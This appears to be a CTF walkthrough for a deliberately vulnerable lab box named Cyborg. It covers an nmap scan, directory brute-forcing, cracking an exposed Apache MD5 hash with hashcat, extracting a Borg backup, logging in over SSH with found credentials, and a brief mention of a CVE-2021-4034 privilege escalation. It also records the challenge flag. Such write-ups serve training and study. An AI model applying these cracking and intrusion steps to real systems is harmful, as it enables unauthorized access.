# Cyborg
# A box involving encrypted archives, source code analysis and more.
# Difficulty: Easy 
#
# Tasks:
# 1. Scan the machine, how many ports are open?
# 2. What service is running on port 22?
# 3. What service is running on port 80?
# 4. What is the user.txt flag?
# 5. What is the root.txt flag?

export IP=10.10.176.190

# Scannig machine for open ports via nmap

nmap $IP -sT -sV -sV -oA nmap/res

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-13 14:35 EST
Nmap scan report for 10.10.176.190
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds

# Discovering the web site -- nothing interesting on the main page

# Dirbusting site via gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -x php,sh,txt,js,css,html,py,dic

/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11321]
/admin                (Status: 301) [Size: 314] [--> http://10.10.176.190/admin/]
/etc                  (Status: 301) [Size: 312] [--> http://10.10.176.190/etc/]
Progress: 33031 / 1985049 (1.66%)
# I think that is enough to move further...

# At the /admin directory found the following prompt:
 				Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
# And the archive file:
archive.tar

# At the /etc directory found to files passwd with some password:
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

# and squid.conf that consist, I suppose, configuration info for proxy from the prompt
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users

# Discovering archive.tar file

# No password neede for opening
# There is a home directory full of content. I suppose this is a backup of a user

# Found a couple of different binary files and one README file that says:
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/                

# So from the site above I have got information that Borg is backuping and archiving tool
# That means that I have to extract something from given backup using following command
borg extract home/field/dev/final_archive::music_archive

Enter passphrase for key /home/tommyhellniger/trahmy/cyborgt8/archive/home/field/dev/final_archive:
# But passphrase is needed 

# I suppose that hashe passphrase contains at /etc/passwd file
# So trying to idnetify hash

hash-identifier        

   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
 HASH: ^C

  Bye!

# And cracking hash via hashcat using rockyou.txt wordlist

hashcat --force -a 0 -m 1600 music_archive.hash /usr/share/wordlists/rockyou.txt -O

hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-6100U CPU @ 2.30GHz, 2822/5709 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Tue Dec 13 16:43:00 2022, (3 secs)
Time.Estimated...: Tue Dec 13 16:43:03 2022, (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    13428 H/s (6.92ms) @ Accel:512 Loops:62 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40977/14344385 (0.29%)
Rejected.........: 17/40977 (0.04%)
Restore.Point....: 38928/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1000
Candidate.Engine.: Device Generator
Candidates.#1....: thankyou1 -> lifesux1
Hardware.Mon.#1..: Temp: 46c Util: 98%

Started: Tue Dec 13 16:42:16 2022
Stopped: Tue Dec 13 16:43:04 2022

# So passphrase is:
squidward

# After extrcating of backup alex user's directory is appeared

# In documents folder file note.txt is found:
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3

# Trying this one for getting ssh connection
ssh alex@10.10.176.190

# User shell is pwned!
# User's flag:
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

# Sending linpeass script via scp
# Starting linpeass

# linpeass.sh found CVE-2021-4034
# Donwloading exploit files from explit-db
# Compiling them and run...

# THE BOX IS PWNED!)

